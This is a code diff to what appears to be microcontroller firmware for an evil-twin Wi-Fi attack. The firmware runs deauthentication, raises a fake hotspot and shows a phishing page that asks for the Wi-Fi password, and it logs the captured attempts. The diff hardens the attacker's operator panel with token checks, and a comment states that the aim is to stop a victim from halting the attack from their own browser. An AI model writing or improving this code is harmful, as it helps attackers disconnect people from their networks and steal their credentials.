@@ -22,13 +22,14 @@ WebServer webServer(80);
 
 const char* ADMIN_TOKEN = "7f9a2c8e4b1d603f9a5e8c2b7d41096e"; // hardcode token for /admin and /clear
 
+// true when the request carries the admin token; callers decide what to send on failure
 bool checkToken() {
-  if (webServer.hasArg("token") && webServer.arg("token") == ADMIN_TOKEN) {
-    return true;
-  }
-  webServer.send(401, "text/plain", "");
-  return false;
-} 
+  return webServer.hasArg("token") && webServer.arg("token") == ADMIN_TOKEN;
+}
+
+void denyToken() {
+  webServer.send(401, "text/plain", "401: admin token required");
+}
 
 _Network _networks[16];
 _Network _selectedNetwork;
@@ -208,7 +209,10 @@ void logAttempt(const String& ssid, const String& pass) {
 }
 
 void handleClear() {
-  if (!checkToken()) return;
+  if (!checkToken()) {
+    denyToken();
+    return;
+  }
   
   _logRaw = "";
   _log = "";
@@ -249,6 +253,18 @@ String footer() {
 String indexPage() {
   return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method=post><label>WiFi password:</label>" +
          "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+}
+
+// token prompt shown when the operator panel on / is requested without a token
+String tokenPage() {
+  return "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
+         "<meta charset=\"UTF-8\"></head>"
+         "<body style='font-family:sans-serif;text-align:center;padding-top:3em;'>"
+         "<form method='post' action='/'>"
+         "<h3>Admin access</h3>"
+         "<input type='password' name='token' placeholder='token' required style='padding:8px;'>"
+         "<input type='submit' value='Enter' style='padding:8px;'>"
+         "</form></body></html>";
 }
 
 void setup() {
@@ -327,8 +343,10 @@ String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0
                    "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                    "</head><body><div class='content'>"
                    "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
+                   "<input type='hidden' name='token' value='{token}'>"
                    "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                    "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
+                   "<input type='hidden' name='token' value='{token}'>"
                    "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                    "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
 
@@ -337,6 +355,7 @@ String controlPage() {
   String html = _tempHTML;
 
   // fill the template before any SSID is appended, so SSID text is never read as a placeholder
+  html.replace("{token}", ADMIN_TOKEN);
   html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
   html.replace("{deauth}", deauthing_active ? "stop" : "start");
   html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
@@ -348,7 +367,8 @@ String controlPage() {
       break;
     }
     String bssid = bytesToStr(_networks[i].bssid, 6);
-    html += "<tr><td>" + htmlEscape(_networks[i].ssid) + "</td><td>" + bssid + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bssid + "'>";
+    html += "<tr><td>" + htmlEscape(_networks[i].ssid) + "</td><td>" + bssid + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bssid + "'>"
+            "<input type='hidden' name='token' value='" + String(ADMIN_TOKEN) + "'>";
 
     if (bssid == bytesToStr(_selectedNetwork.bssid, 6)) {
       html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
@@ -403,12 +423,25 @@ bool applyControlArgs() {
 }
 
 void handleIndex() {
-  if (applyControlArgs()) {
-    webServer.send(204);
-    return;
+  // ap/deauth/hotspot are operator commands; without a token check a victim
+  // could stop the attack from its own browser (POST /?hotspot=stop)
+  if (webServer.hasArg("ap") || webServer.hasArg("deauth") || webServer.hasArg("hotspot")) {
+    if (!checkToken()) {
+      denyToken();
+      return;
+    }
+    if (applyControlArgs()) {
+      webServer.send(204);
+      return;
+    }
   }
 
   if (hotspot_active == false) {
+    // no evil twin: / is the operator panel, so it needs the token just like /admin
+    if (!checkToken()) {
+      webServer.send(401, "text/html", tokenPage());
+      return;
+    }
     webServer.send(200, "text/html", controlPage());
     return;
   }
@@ -432,7 +465,10 @@ void handleIndex() {
 }
 
 void handleAdmin() {
-  if (!checkToken()) return;
+  if (!checkToken()) {
+    denyToken();
+    return;
+  }
 
   if (applyControlArgs()) {
     webServer.send(204);
